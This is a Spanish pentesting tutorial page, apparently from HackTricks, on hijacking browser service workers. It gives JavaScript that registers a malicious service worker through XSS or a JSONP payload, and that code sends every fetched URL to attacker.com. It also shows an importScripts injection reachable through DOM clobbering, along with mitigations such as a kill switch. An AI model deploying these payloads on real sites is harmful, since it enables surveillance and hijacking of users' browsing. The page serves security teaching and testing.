# Abusando de los Service Workers



<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n del PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n la [**ropa oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** **üê¶**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encuentra vulnerabilidades que importan m√°s para que puedas solucionarlas m√°s r√°pido. Intruder rastrea tu superficie de ataque, ejecuta escaneos proactivos de amenazas, encuentra problemas en toda tu pila tecnol√≥gica, desde APIs hasta aplicaciones web y sistemas en la nube. [**Pru√©balo gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoy.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Informaci√≥n B√°sica

Un **service worker** es un script ejecutado por tu navegador en segundo plano, independiente de cualquier p√°gina web, que permite funciones que no requieren una p√°gina web o interacci√≥n del usuario, mejorando as√≠ las capacidades de **procesamiento sin conexi√≥n y en segundo plano**. Puedes encontrar informaci√≥n detallada sobre los service workers [aqu√≠](https://developers.google.com/web/fundamentals/primers/service-workers). Al explotar los service workers dentro de un dominio web vulnerable, los atacantes pueden tomar control de las interacciones de la v√≠ctima con todas las p√°ginas dentro de ese dominio.


### Verificaci√≥n de Service Workers Existentes

Los service workers existentes se pueden verificar en la secci√≥n de **Service Workers** de la pesta√±a de **Application** en las **Herramientas para desarrolladores**. Otro m√©todo es visitar [chrome://serviceworker-internals](https://chromium.googlesource.com/chromium/src/+/main/docs/security/chrome%3A/serviceworker-internals) para obtener una vista m√°s detallada.

### Notificaciones Push

Las **permisos de notificaciones push** impactan directamente la capacidad de un **service worker** para comunicarse con el servidor sin interacci√≥n directa del usuario. Si se niegan los permisos, se limita el potencial del service worker para representar una amenaza continua. Por el contrario, otorgar permisos aumenta los riesgos de seguridad al permitir la recepci√≥n y ejecuci√≥n de posibles exploits.

## Ataque Creando un Service Worker

Para explotar esta vulnerabilidad necesitas encontrar:

* Una forma de **subir archivos JS arbitrarios** al servidor y un **XSS para cargar el service worker** del archivo JS subido
* Una **solicitud JSONP vulnerable** donde puedas **manipular la salida (con c√≥digo JS arbitrario)** y un **XSS** para **cargar el JSONP con un payload** que **cargar√° un service worker malicioso**.

En el siguiente ejemplo voy a presentar un c√≥digo para **registrar un nuevo service worker** que escuchar√° el evento `fetch` y **enviar√° al servidor del atacante cada URL obtenida** (este es el c√≥digo que necesitar√≠as **subir** al **servidor** o cargar a trav√©s de una respuesta **JSONP vulnerable**):
```javascript
self.addEventListener('fetch', function(e) {
e.respondWith(caches.match(e.request).then(function(response) {
fetch('https://attacker.com/fetch_url/' + e.request.url)
});
```
Y este es el c√≥digo que **registrar√° el worker** (el c√≥digo que deber√≠as poder ejecutar abusando de un **XSS**). En este caso, se enviar√° una solicitud **GET** al servidor de los **atacantes** notificando si el **registro** del service worker fue exitoso o no:
```javascript
<script>
window.addEventListener('load', function() {
var sw = "/uploaded/ws_js.js";
navigator.serviceWorker.register(sw, {scope: '/'})
.then(function(registration) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/success", true);
xhttp2.send();
}, function (err) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/error", true);
xhttp2.send();
});
});
</script>
```
En caso de abusar de un punto final JSONP vulnerable, debes colocar el valor dentro de `var sw`. Por ejemplo:
```javascript
var sw = "/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//";
```
Existe un **C2** dedicado a la **explotaci√≥n de Service Workers** llamado [**Shadow Workers**](https://shadow-workers.github.io) que ser√° muy √∫til para abusar de estas vulnerabilidades.

La directiva de **cach√© de 24 horas** limita la vida de un **service worker (SW)** malicioso o comprometido a un m√°ximo de 24 horas despu√©s de una correcci√≥n de vulnerabilidad XSS, asumiendo un estado de cliente en l√≠nea. Para minimizar la vulnerabilidad, los operadores del sitio pueden reducir el Tiempo de Vida (TTL) del script de SW. Tambi√©n se recomienda a los desarrolladores crear un [**interruptor de apagado de service worker**](https://stackoverflow.com/questions/33986976/how-can-i-remove-a-buggy-service-worker-or-implement-a-kill-switch/38980776#38980776) para una desactivaci√≥n r√°pida.

## Abusando de `importScripts` en un SW a trav√©s de DOM Clobbering

La funci√≥n **`importScripts`** llamada desde un Service Worker puede **importar un script de un dominio diferente**. Si esta funci√≥n se llama usando un **par√°metro que un atacante podr√≠a** modificar, podr√≠a **importar un script JS de su dominio** y obtener XSS.

**Esto incluso evade las protecciones CSP.**

**C√≥digo vulnerable de ejemplo:**

* **index.html**
```html
<script>
navigator.serviceWorker.register('/dom-invader/testcases/augmented-dom-import-scripts/sw.js' + location.search);
// attacker controls location.search
</script>
```
* **sw.js**
```javascript
const searchParams = new URLSearchParams(location.search);
let host = searchParams.get('host');
self.importScripts(host + "/sw_extra.js");
//host can be controllable by an attacker
```
### Con DOM Clobbering

Para obtener m√°s informaci√≥n sobre qu√© es el DOM Clobbering, consulta:

{% content-ref url="dom-clobbering.md" %}
[dom-clobbering.md](dom-clobbering.md)
{% endcontent-ref %}

Si la URL/dominio que el SW est√° utilizando para llamar a **`importScripts`** est√° **dentro de un elemento HTML**, es **posible modificarlo mediante DOM Clobbering** para hacer que el SW **cargue un script desde tu propio dominio**.

Para ver un ejemplo de esto, consulta el enlace de referencia.

## Referencias

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Encuentra las vulnerabilidades que m√°s importan para que puedas solucionarlas m√°s r√°pido. Intruder rastrea tu superficie de ataque, ejecuta escaneos proactivos de amenazas, encuentra problemas en toda tu pila tecnol√≥gica, desde APIs hasta aplicaciones web y sistemas en la nube. [**Pru√©balo gratis**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoy.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres que tu **empresa sea anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n del PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme en** **Twitter** **üê¶**[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
